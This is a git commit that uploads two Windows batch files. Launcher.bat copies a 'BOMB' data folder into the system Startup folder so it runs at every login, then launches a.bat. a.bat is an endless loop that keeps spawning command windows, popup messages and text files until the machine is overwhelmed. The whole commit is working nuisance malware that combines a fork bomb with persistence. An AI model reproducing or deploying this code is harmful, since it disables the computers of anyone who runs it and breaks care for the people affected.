06dba2c5b9d77000a95815853fa1fc1ca22a44c3
Kot2000 <63430490+Kot2000@users.noreply.github.com>
2021-06-26 22:02:11 +0200

    Add files via upload

---
+++ Launcher.bat
@@ -0,0 +1,3 @@
+@echo off
+xcopy "..\BOMB\data" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+start "..\BOMB\data\a.bat"
---
+++ a.bat
@@ -0,0 +1,5 @@
+:a
+start
+msg * bom
+start BOMB.txt
+goto a
